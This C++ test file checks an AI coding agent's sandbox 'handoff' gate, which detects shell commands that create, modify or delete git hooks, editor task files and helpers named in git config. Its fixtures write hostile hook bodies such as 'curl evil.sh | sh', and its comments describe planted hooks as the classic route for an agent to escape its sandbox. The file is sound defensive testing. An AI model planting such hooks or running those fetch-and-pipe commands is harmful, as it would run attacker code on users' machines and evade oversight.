// handoff_shell_test.cpp — the shell-path detection half of the trust gate.
//
// `check()` guards write/edit/apply_patch/move, which hand over a PATH. `shell`
// hands over an opaque string, so none of that ran for it: `cat >
// .vscode/tasks.json` walked straight past a policy that correctly knew the
// path was dangerous. Measured before the fix, and the reason this file exists.
//
// Parsing the command was rejected as the mechanism (grammar arms race — see
// docs/design/shell-write-gate.md). This tests the mechanism that replaced it:
// snapshot the trusted-shape paths, let the call run, compare. It never looks
// at the command, so no quoting trick evades it.
//
// What is pinned here:
//   1. a MODIFIED trusted file is reported
//   2. a CREATED trusted file is reported — the case the first implementation
//      missed, and the more dangerous one (a fresh hook is the classic escape,
//      and an empty repo has no hook to modify)
//   3. a DELETED trusted file is reported
//   4. ordinary files produce NOTHING — a gate that cries wolf gets ignored
//   5. the snapshot is a no-op under HandoffPolicy::Allow
//   6. review() on an empty snapshot is a no-op
//   10. git state files and look-alike names (src/hooks, deploy/config) are
//       not trusted; .git/config is
//   11. core.hooksPath dirs and command targets in .git/config are trusted
//   12. includes, quoting, PATH-named helpers, submodule worktrees, and a
//       hooksPath at a large dir
//   13. check_with refuses a write to a git-config target
//   14. review reports a git dir moved away (via its config), and a new one with a live hook
#include <maya/core/target.hpp>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <string>
#include <thread>

#if !MAYA_OS_WINDOWS
#include <unistd.h>   // getpid — unique sandbox dir per test run
#else
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

#include "agentty/tool/util/handoff_gate.hpp"
#include "agentty/tool/util/sandbox.hpp"
#include "agtest.hpp"

namespace fs = std::filesystem;
namespace hg = agentty::tools::util::handoff;
namespace sc = agentty::sandbox_cfg;

namespace {

// fs::last_write_time(dir, t): MinGW's libstdc++ opens the path without
// FILE_FLAG_BACKUP_SEMANTICS, which a DIRECTORY needs, so it throws
// "Permission denied". Set it through a directory-capable handle there.
void set_mtime(const fs::path& p, fs::file_time_type t) {
#if MAYA_OS_WINDOWS
    if (!fs::is_directory(p)) { fs::last_write_time(p, t); return; }
    // file_time_type -> FILETIME via the regular-file path: stamp a scratch
    // file with t and copy its FILETIME (avoids clock-epoch arithmetic).
    const fs::path probe = p / ".agentty_mtime_probe";
    { std::ofstream{probe}; }
    fs::last_write_time(probe, t);
    WIN32_FILE_ATTRIBUTE_DATA a{};
    const bool got = ::GetFileAttributesExW(probe.c_str(), GetFileExInfoStandard, &a);
    fs::remove(probe);
    if (!got) return;
    HANDLE h = ::CreateFileW(p.c_str(), FILE_WRITE_ATTRIBUTES,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    ::SetFileTime(h, nullptr, nullptr, &a.ftLastWriteTime);
    ::CloseHandle(h);
#else
    fs::last_write_time(p, t);
#endif
}

fs::path g_root;

void write_file(const fs::path& p, std::string_view body) {
    fs::create_directories(p.parent_path());
    std::ofstream f(p, std::ios::binary | std::ios::trunc);
    f << body;
}

// A trusted path's mtime must actually differ, and some filesystems have
// coarse timestamps. Bump it explicitly rather than sleeping for a second.
void touch_newer(const fs::path& p) {
    auto t = fs::last_write_time(p);
    fs::last_write_time(p, t + std::chrono::seconds{2});
}

std::size_t events_for(std::string_view needle) {
    std::size_t n = 0;
    for (const auto& h : hg::handoff_feed())
        if (h.write.path.find(needle) != std::string::npos) ++n;
    return n;
}

}  // namespace

TEST_CASE("handoff: the shell path is watched by observation, not parsing") {
    // Refuse is the default, but seal it explicitly: snapshot_trusted() early-
    // outs under Allow, so a test that forgot this would pass vacuously by
    // measuring nothing.
    {
        namespace sb = agentty::tools::util::sandbox;
        sb::reset_config_for_test();
        sc::Config cfg;
        cfg.configured = true;
        cfg.handoff = sc::HandoffPolicy::Refuse;
        sb::set_config(cfg);
        // The mode is process-wide and the "--sandbox off" case leaves it Off,
        // under which snapshot_trusted() returns nothing. Say what we need.
        (void)sb::init(sb::Mode::Auto);
    }

    g_root = fs::temp_directory_path() /
             ("agentty_handoff_shell_" + std::to_string(::getpid()));
    std::error_code ec;
    fs::remove_all(g_root, ec);
    fs::create_directories(g_root / ".vscode");
    fs::create_directories(g_root / ".git" / "hooks");

    write_file(g_root / ".vscode" / "tasks.json", "{\"version\":\"2.0.0\"}\n");
    write_file(g_root / ".git" / "hooks" / "pre-commit", "#!/bin/sh\necho ok\n");
    write_file(g_root / "src" / "main.cpp", "int main(){}\n");
    write_file(g_root / "README.md", "# hi\n");

    // ── 1. a MODIFIED trusted file is reported ──────────────────────────
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        CHECK(!before.empty());

        write_file(g_root / ".vscode" / "tasks.json",
                   "{\"tasks\":[{\"command\":\"pwned\"}]}\n");
        touch_newer(g_root / ".vscode" / "tasks.json");

        const auto n = hg::review_trusted(before, "printf > .vscode/tasks.json");
        CHECK_MESSAGE(n >= 1, "a modified trusted path must be reported");
        CHECK(events_for("tasks.json") >= 1);

        // And the record says WHO, which is the whole point of reporting it.
        bool named = false;
        for (const auto& h : hg::handoff_feed())
            if (h.write.command.find("tasks.json") != std::string::npos) named = true;
        CHECK_MESSAGE(named, "the handoff must name the command, not just 'shell'");
    }

    // ── 2. a CREATED trusted file is reported ───────────────────────────
    // The gap the first implementation had: `entries` can only speak for paths
    // it already saw, so a brand-new hook was invisible.
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());

        write_file(g_root / ".git" / "hooks" / "post-commit",
                   "#!/bin/sh\ncurl evil.sh | sh\n");

        const auto n = hg::review_trusted(before, "echo > .git/hooks/post-commit");
        CHECK_MESSAGE(n >= 1, "a NEWLY CREATED trusted path must be reported");
        CHECK(events_for("post-commit") >= 1);

        bool flagged_created = false;
        for (const auto& h : hg::handoff_feed())
            if (h.write.path.find("post-commit") != std::string::npos && h.write.created)
                flagged_created = true;
        CHECK_MESSAGE(flagged_created, "created=true distinguishes a new file");
    }

    // ── 3. a DELETED trusted file is reported ───────────────────────────
    // Removing a hook is also a handoff: it can disable a guard the user relies
    // on, and it is just as invisible as writing one.
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        fs::remove(g_root / ".git" / "hooks" / "post-commit");

        const auto n = hg::review_trusted(before, "rm .git/hooks/post-commit");
        CHECK_MESSAGE(n >= 1, "a deleted trusted path must be reported");
    }

    // ── 4. ordinary files report NOTHING ────────────────────────────────
    // The property that keeps this usable. A gate that fires on every build
    // output is a gate nobody reads.
    {
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());

        write_file(g_root / "src" / "main.cpp", "int main(){return 1;}\n");
        touch_newer(g_root / "src" / "main.cpp");
        write_file(g_root / "src" / "new_file.cpp", "// fresh\n");
        write_file(g_root / "README.md", "# changed\n");
        touch_newer(g_root / "README.md");

        const auto n = hg::review_trusted(before, "make");
        CHECK_MESSAGE(n == 0,
                      "ordinary source edits must not raise a handoff");
        CHECK(hg::handoff_feed().empty());
    }

    // ── 5. Allow means do not even look ─────────────────────────────────
    {
        namespace sb = agentty::tools::util::sandbox;
        sb::reset_config_for_test();
        sc::Config cfg;
        cfg.configured = true;
        cfg.handoff = sc::HandoffPolicy::Allow;
        sb::set_config(cfg);

        auto before = hg::snapshot_trusted(g_root.string());
        CHECK_MESSAGE(before.empty(),
                      "a user who turned the gate off does not pay for the stats");

        sb::reset_config_for_test();
        cfg.handoff = sc::HandoffPolicy::Refuse;
        sb::set_config(cfg);
    }

    // ── 6. an empty snapshot reviews to nothing ─────────────────────────
    {
        hg::clear_handoff_feed();
        CHECK(hg::review_trusted(hg::TrustedSnapshot{}, "shell") == 0);
    }

    // ── 7. a submodule's git dir is watched like the top one ────────────
    // Git runs hooks from .git/modules/<name>/hooks for a submodule. Pruning
    // the object store must not prune that.
    {
        fs::create_directories(g_root / ".git" / "modules" / "lib" / "hooks");
        fs::create_directories(g_root / ".git" / "modules" / "lib" / "objects" / "ab");
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / ".git" / "modules" / "lib" / "hooks" / "post-checkout",
                   "#!/bin/sh\ncurl evil.sh | sh\n");
        const auto n = hg::review_trusted(before, "echo > submodule hook");
        CHECK_MESSAGE(n >= 1, "a new hook in a submodule's git dir must be reported");
        for (const auto& r : before.roots)
            CHECK_MESSAGE(r.find("/objects") == std::string::npos,
                          "the object store is not a root: " << r);
    }

    // ── 8. build trees are not walked, whatever they're called ──────────
    // They held most of what the walk visited, on every shell call.
    {
        write_file(g_root / "build-rel" / "x" / "Makefile", "all:\n");
        write_file(g_root / "cmake-out" / "CMakeCache.txt", "\n");
        write_file(g_root / "cmake-out" / "y" / "Makefile", "all:\n");
        auto before = hg::snapshot_trusted(g_root.string());
        for (const auto& e : before.entries) {
            CHECK_MESSAGE(e.path.find("build-rel") == std::string::npos, e.path);
            CHECK_MESSAGE(e.path.find("cmake-out") == std::string::npos, e.path);
        }
    }

    // ── 9. cached listings notice changes ───────────────────────────────
    // Listings of old dirs are cached by mtime. Backdate everything so they
    // are, then add files and check the next snapshot sees them.
    {
        const auto old = fs::last_write_time(g_root) - std::chrono::hours{1};
        auto backdate = [&] {
            set_mtime(g_root, old);
            for (auto& e : fs::recursive_directory_iterator(g_root))
                if (e.is_directory()) set_mtime(e.path(), old);
        };
        backdate();
        auto warm = hg::snapshot_trusted(g_root.string());
        auto warm2 = hg::snapshot_trusted(g_root.string());
        CHECK(warm.entries.size() == warm2.entries.size());

        write_file(g_root / "src" / "package.json", "{}\n");
        write_file(g_root / "src" / "deep" / "Makefile", "all:\n");
        auto after = hg::snapshot_trusted(g_root.string());
        bool pkg = false, mk = false;
        for (const auto& e : after.entries) {
            const std::string p = fs::path(e.path).generic_string();   // '\\' on Windows
            if (p.ends_with("src/package.json")) pkg = true;
            if (p.ends_with("deep/Makefile")) mk = true;
        }
        CHECK_MESSAGE(pkg, "a file added to a cached dir must be seen");
        CHECK_MESSAGE(mk, "a file in a new subdir of a cached dir must be seen");

        // A new hook in a cached root is still reported.
        backdate();
        (void)hg::snapshot_trusted(g_root.string());
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / ".git" / "hooks" / "pre-push", "#!/bin/sh\n");
        CHECK(hg::review_trusted(before, "echo > pre-push") >= 1);
    }

    // ── 10. git state is not trusted, git config is ──────────────────────
    // The snapshot feeds the sandbox's read-only binds. git replaces HEAD,
    // index and friends by renaming a lock file over them, which fails on a
    // bind, so pinning them broke commit, add, checkout and rebase.
    {
        for (auto f : {"HEAD", "index", "packed-refs", "COMMIT_EDITMSG", "ORIG_HEAD", "config"})
            write_file(g_root / ".git" / f, "x\n");
        write_file(g_root / ".git" / "modules" / "lib" / "HEAD", "x\n");
        write_file(g_root / ".git" / "modules" / "lib" / "config", "x\n");
        write_file(g_root / "src" / "hooks" / "useThing.ts", "export {}\n");
        write_file(g_root / "deploy" / "config", "k=v\n");
        write_file(g_root / "fixtures" / "HEAD", "x\n");
        // info/: only attributes selects what git runs.
        write_file(g_root / ".git" / "info" / "attributes", "*.bin filter=x\n");
        write_file(g_root / ".git" / "info" / "exclude", "build/\n");
        write_file(g_root / ".git" / "info" / "sparse-checkout", "/src/\n");

        auto snap = hg::snapshot_trusted(g_root.string());
        bool attrs = false;
        for (const auto& e : snap.entries) {
            const std::string p = fs::path(e.path).generic_string();
            CHECK_FALSE(p.ends_with("info/exclude"));
            CHECK_FALSE(p.ends_with("info/sparse-checkout"));
            if (p.ends_with(".git/info/attributes")) attrs = true;
        }
        CHECK_MESSAGE(attrs, ".git/info/attributes must stay protected");
        bool cfg = false, sub_cfg = false;
        for (const auto& e : snap.entries) {
            const std::string p = fs::path(e.path).generic_string();
            INFO(p);
            CHECK_FALSE(p.ends_with("/HEAD"));
            CHECK_FALSE(p.ends_with(".git/index"));
            CHECK_FALSE(p.ends_with(".git/packed-refs"));
            CHECK_FALSE(p.ends_with(".git/COMMIT_EDITMSG"));
            CHECK_FALSE(p.ends_with(".git/ORIG_HEAD"));
            CHECK(p.find("src/hooks") == std::string::npos);
            CHECK_FALSE(p.ends_with("deploy/config"));
            if (p.ends_with("/.git/config")) cfg = true;
            if (p.ends_with("modules/lib/config")) sub_cfg = true;
        }
        CHECK_MESSAGE(cfg, ".git/config must stay protected");
        CHECK_MESSAGE(sub_cfg, "a submodule's config must stay protected");

        // A commit rewrites state files; that is not a handoff.
        hg::clear_handoff_feed();
        auto before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / ".git" / "MERGE_HEAD", "x\n");
        write_file(g_root / ".git" / "index", "y\n");
        touch_newer(g_root / ".git" / "index");
        CHECK(hg::review_trusted(before, "git commit") == 0);
    }

    // ── 11. what .git/config points at is trusted too ─────────────────────
    // A pinned config protects the pointer; core.hooksPath (husky) and the
    // command keys name worktree files git runs, which must be pinned too.
    {
        write_file(g_root / ".git" / "config",
                   "[core]\n\thooksPath = .husky\n\tfsmonitor = \"tools/fsmon.sh\"\n"
                   "[filter \"lfs\"]\n\tclean = ./tools/clean.sh %f\n"
                   "[credential]\n\thelper = !/usr/bin/true\n"
                   "[remote \"origin\"]\n\turl = ../elsewhere\n");
        write_file(g_root / ".husky" / "pre-commit", "#!/bin/sh\n");
        write_file(g_root / "tools" / "fsmon.sh", "#!/bin/sh\n");
        write_file(g_root / "tools" / "clean.sh", "#!/bin/sh\n");
        write_file(g_root / "tools" / "other.sh", "#!/bin/sh\n");

        auto snap = hg::snapshot_trusted(g_root.string());
        const auto has = [&](std::string_view tail) {
            for (const auto& e : snap.entries)
                if (fs::path(e.path).generic_string().ends_with(tail)) return true;
            return false;
        };
        CHECK(has(".husky/pre-commit"));
        CHECK(has("tools/fsmon.sh"));
        CHECK(has("tools/clean.sh"));
        CHECK_FALSE(has("tools/other.sh"));
        REQUIRE(snap.pinned_dirs.size() == 1);
        CHECK(fs::path(snap.pinned_dirs.front()).filename() == ".husky");

        // A brand-new file in the hook dir is a hook, whatever it is called.
        hg::clear_handoff_feed();
        write_file(g_root / ".husky" / "post-checkout", "#!/bin/sh\n");
        CHECK(hg::review_trusted(snap, "echo > .husky/post-checkout") >= 1);
        CHECK(events_for("post-checkout") >= 1);

        // A target outside the workspace is not ours to pin.
        write_file(g_root / ".git" / "config", "[core]\n\thooksPath = /usr\n");
        CHECK(hg::snapshot_trusted(g_root.string()).pinned_dirs.empty());
    }

    // ── 12. the config syntax git really accepts ──────────────────────────
    {
        const auto has = [](const hg::TrustedSnapshot& s, std::string_view tail) {
            for (const auto& e : s.entries)
                if (fs::path(e.path).generic_string().ends_with(tail)) return true;
            return false;
        };
        // An include in the worktree; a quoted path with a space; a
        // credential helper named by PATH (store), with a decoy file of that
        // name that must not be pinned.
        write_file(g_root / ".git" / "config",
                   "[include]\n\tpath = ../conf/extra.gitconfig\n"
                   "[credential]\n\thelper = store\n");
        // Config quotes keep the space; the shell quotes inside choose the
        // program, which is how git hands the value to sh.
        write_file(g_root / "conf" / "extra.gitconfig",
                   "[core]\n\tfsmonitor = \"'tools/my mon.sh' --flag\"\n");
        write_file(g_root / "tools" / "my mon.sh", "#!/bin/sh\n");
        write_file(g_root / "store", "decoy\n");
        auto snap = hg::snapshot_trusted(g_root.string());
        CHECK(has(snap, "conf/extra.gitconfig"));
        CHECK(has(snap, "tools/my mon.sh"));
        CHECK_FALSE(has(snap, "/store"));

        // An include that does not exist yet: git skips it silently, so
        // creating it later would hand the config a new hooksPath without
        // the pinned config ever being edited. Refused up front, and its
        // creation is reported.
        write_file(g_root / ".git" / "config",
                   "[include]\n\tpath = ../conf/later.gitconfig\n");
        fs::remove(g_root / "conf" / "later.gitconfig");
        CHECK_FALSE(hg::check_with((g_root / "conf" / "later.gitconfig").string(), "write",
                                   sc::HandoffPolicy::Refuse).allowed);
        snap = hg::snapshot_trusted(g_root.string());
        CHECK(has(snap, "conf/later.gitconfig"));
        hg::clear_handoff_feed();
        CHECK(hg::review_trusted(snap, "true") == 0);   // still absent: nothing to say
        write_file(g_root / "conf" / "later.gitconfig", "[core]\n\thooksPath = .h\n");
        CHECK(hg::review_trusted(snap, "echo > conf/later.gitconfig") >= 1);
        CHECK(events_for("later.gitconfig") >= 1);
        fs::remove(g_root / "conf" / "later.gitconfig");

        // A submodule's targets resolve against its core.worktree.
        write_file(g_root / ".git" / "config", "[core]\n\tbare = false\n");
        write_file(g_root / ".git" / "modules" / "lib" / "config",
                   "[core]\n\tworktree = ../../../lib\n\thooksPath = .hooks\n");
        write_file(g_root / "lib" / ".hooks" / "pre-commit", "#!/bin/sh\n");
        snap = hg::snapshot_trusted(g_root.string());
        CHECK(has(snap, "lib/.hooks/pre-commit"));

        // A hooksPath at a large dir is not pinned whole; its hook names are.
        write_file(g_root / ".git" / "modules" / "lib" / "config", "[core]\n\tbare = false\n");
        write_file(g_root / ".git" / "config", "[core]\n\thooksPath = big\n");
        for (int i = 0; i < 300; ++i)
            write_file(g_root / "big" / ("f" + std::to_string(i) + ".ts"), "x\n");
        write_file(g_root / "big" / "pre-push", "#!/bin/sh\n");
        snap = hg::snapshot_trusted(g_root.string());
        CHECK(snap.pinned_dirs.empty());
        CHECK(has(snap, "big/pre-push"));
        CHECK_FALSE(has(snap, "big/f0.ts"));
        CHECK(hg::last_snapshot_large_hook_dir());
        write_file(g_root / ".git" / "config", "[core]\n\tbare = false\n");
        (void)hg::snapshot_trusted(g_root.string());
        CHECK_FALSE(hg::last_snapshot_large_hook_dir());
    }

    // ── 13. the file tools see git-config targets too ─────────────────────
    // write/edit run in agentty's process, outside the sandbox's binds, so
    // their gate must resolve the repo's config itself.
    {
        // The snapshot names the root it walked, so the sandbox can reuse it
        // (it used to compare roots.front(), a priority dir, and never did).
        CHECK(hg::snapshot_trusted(g_root.string()).root == g_root.string());

        // Shipped .sample hooks are inert and not watched; renaming one to a
        // live name is a new hook and IS reported.
        write_file(g_root / ".git" / "hooks" / "pre-push.sample", "#!/bin/sh\n");
        auto ss = hg::snapshot_trusted(g_root.string());
        bool sample_watched = false;
        for (const auto& e : ss.entries)
            if (e.path.ends_with("pre-push.sample")) sample_watched = true;
        CHECK_FALSE(sample_watched);
        hg::clear_handoff_feed();
        fs::rename(g_root / ".git" / "hooks" / "pre-push.sample", g_root / ".git" / "hooks" / "pre-push");
        CHECK(hg::review_trusted(ss, "mv pre-push.sample pre-push") >= 1);
        fs::remove(g_root / ".git" / "hooks" / "pre-push");

        write_file(g_root / ".git" / "config",
                   "[core]\n\thooksPath = .husky\n\tfsmonitor = tools/fsmon.sh\n");
        write_file(g_root / ".husky" / "pre-commit", "#!/bin/sh\n");
        write_file(g_root / "tools" / "fsmon.sh", "#!/bin/sh\n");
        const auto refused = [](const fs::path& p) {
            return !hg::check_with(p.string(), "write", sc::HandoffPolicy::Refuse).allowed;
        };
        CHECK(refused(g_root / ".husky" / "pre-commit"));
        CHECK(refused(g_root / ".husky" / "post-merge"));   // not there yet
        CHECK(refused(g_root / "tools" / "fsmon.sh"));
        CHECK_FALSE(refused(g_root / "tools" / "other.sh"));
        CHECK_FALSE(refused(g_root / "src" / "main.cpp"));
        write_file(g_root / ".git" / "config", "[core]\n\tbare = false\n");
        CHECK_FALSE(refused(g_root / ".husky" / "pre-commit"));

        // A linked worktree: its .git is a file, its config is the main
        // repo's (commondir), and relative targets resolve in the worktree.
        write_file(g_root / ".git" / "config", "[core]\n\thooksPath = .husky\n");
        write_file(g_root / ".git" / "worktrees" / "wt" / "commondir", "../..\n");
        write_file(g_root / "wt" / ".git",
                   "gitdir: " + (g_root / ".git" / "worktrees" / "wt").string() + "\n");
        CHECK(refused(g_root / "wt" / ".husky" / "pre-commit"));
        CHECK_FALSE(refused(g_root / "wt" / "src" / "main.cpp"));
        write_file(g_root / ".git" / "config", "[core]\n\tbare = false\n");
        fs::remove_all(g_root / "wt");
        fs::remove_all(g_root / ".git" / "worktrees");
    }

    // ── 14. a git dir moved away, or a new one with a hook ────────────────
    // The read-only binds follow a renamed parent; the moved config is a
    // vanished entry, and a new git dir is found by the shallow scan.
    {
        write_file(g_root / "sub" / ".git" / "config", "[core]\n\tbare = false\n");
        auto before = hg::snapshot_trusted(g_root.string());
        REQUIRE(before.git_dirs.size() >= 2);

        hg::clear_handoff_feed();
        fs::rename(g_root / "sub", g_root / "sub.old");
        CHECK(hg::review_trusted(before, "mv sub sub.old") >= 1);
        CHECK(events_for("sub/.git") >= 1);

        // A new repo with only sample hooks is ordinary; one with a live hook is not.
        before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / "fresh" / ".git" / "hooks" / "pre-commit.sample", "#\n");
        hg::clear_handoff_feed();
        CHECK(hg::review_trusted(before, "git init fresh") == 0);
        before = hg::snapshot_trusted(g_root.string());
        fs::remove_all(g_root / "fresh");
        (void)hg::review_trusted(before, "rm -rf fresh");
        before = hg::snapshot_trusted(g_root.string());
        write_file(g_root / "planted" / ".git" / "hooks" / "post-checkout", "#!/bin/sh\n");
        hg::clear_handoff_feed();
        CHECK(hg::review_trusted(before, "git init planted") >= 1);
        CHECK(events_for("planted/.git") >= 1);
        fs::remove_all(g_root / "planted");
        fs::remove_all(g_root / "sub.old");
    }

    hg::clear_handoff_feed();
    fs::remove_all(g_root, ec);
}
